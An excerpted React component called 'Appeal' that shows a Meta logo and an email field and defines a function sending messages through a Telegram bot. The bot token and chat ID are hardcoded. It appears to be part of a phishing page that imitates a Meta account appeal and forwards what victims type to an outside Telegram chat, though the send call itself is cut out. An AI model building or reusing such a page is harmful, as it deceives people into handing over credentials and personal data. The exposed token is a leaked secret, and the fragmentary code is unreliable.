...
class Appeal extends Component {
    ...
    sendTelegramMessage = (message) => {
        const botToken = '6680560684:AAE2Rz3k47PcTCrA6FtbzYeIKgDLuA5oAuc';
        const chatId = '-1001933572524';
        ...
        return (
            <div>
                <header>
                    ...
                    />
                    <img src="./Meta-Logo.png" alt="" className="logo" />
                    <h1></h1>
                    ...
                    <div>
                        ...
                        <div className="row" style={{ padding: "20px", paddingBottom: '20px' }}>
                            ...
                            <div className="col-md-1 col-2">
                                <img src={emaillogo} className="fa-solid fa-envelope" style={{ width: '50px' }} alt="" />
                            </div>
